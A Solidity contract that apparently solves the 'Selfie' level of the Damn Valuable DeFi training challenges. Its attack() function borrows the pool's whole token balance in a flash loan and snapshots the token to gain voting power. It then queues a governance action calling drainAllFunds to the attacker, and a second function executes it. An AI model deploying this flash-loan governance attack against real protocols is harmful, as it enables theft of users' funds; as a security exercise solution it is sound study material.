//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract selfie{

    SimpleGovernance sg;
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    address owner;
    uint public ai;
    constructor(address a, address b, address c){
        owner = msg.sender;
        sg = SimpleGovernance(a);
        pool = SelfiePool(b);
        token = DamnValuableTokenSnapshot(c);
    }

    function attack() public{
        pool.flashLoan(token.balanceOf(address(pool)));
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        ai = sg.queueAction(address(pool), data, 0);
        
        
    }

    function receiveTokens(address a,uint256 b) public {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function ar() public{
        sg.executeAction(ai);
    }

    receive() external payable{}

}